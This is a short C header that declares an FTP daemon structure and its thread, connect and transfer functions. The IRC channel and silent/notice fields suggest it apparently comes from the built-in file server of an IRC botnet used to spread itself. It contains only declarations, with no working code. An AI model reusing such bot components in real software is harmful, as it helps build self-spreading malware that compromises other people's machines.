
#ifndef NO_EFTPD
typedef struct FTP 
{
	SOCKET sock;
	char filename[MAX_PATH];
	char requestname[MAX_PATH];
	int threadnum;
	int threads;
	int port;
	char chan[128];
	BOOL notice;
	BOOL silent;
	BOOL verbose;
	BOOL gotinfo;
	void *conn;

} FTP;

void killftpd(char *target,void *conn,BOOL silent,BOOL verbose);

int FTP_Data_Connect(char *ip,int port,char *err,void *conn,char *target,BOOL silent,SOCKET &data_sock);
int FTP_Data_Transfer(SOCKET data_sock);
//int FTP_Data_Connect(char *ip,int port,char *err,void *conn,char *target,BOOL silent);
//int FTP_Data_Transfer();
DWORD WINAPI ftpd(LPVOID pParam);
#endif